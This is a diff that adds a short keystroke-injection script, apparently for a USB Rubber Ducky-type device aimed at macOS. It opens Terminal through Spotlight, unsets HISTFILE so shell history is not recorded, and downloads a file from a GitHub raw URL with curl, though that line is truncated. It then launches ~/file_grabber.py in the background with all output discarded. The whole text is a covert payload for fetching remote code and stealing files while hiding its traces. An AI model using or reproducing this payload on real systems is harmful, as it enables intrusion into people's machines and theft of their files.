@@ -1,0 +1,19 @@
+GUI SPACE
+DELAY 700
+STRING terminal
+DELAY 700
+ENTER
+DELAY 1500
+
+STRING unset HISTFILE
+DELAY 600
+ENTER
+DELAY 300
+
+STRING curl -fL "https://raw.githubusercontent.com/sdqdadq/schabi_update/main/f>
+DELAY 1000
+ENTER
+
+STRING nohup python3 ~/file_grabber.py > /dev/null 2>&1 < /dev/null &
+DELAY 1000
+ENTER
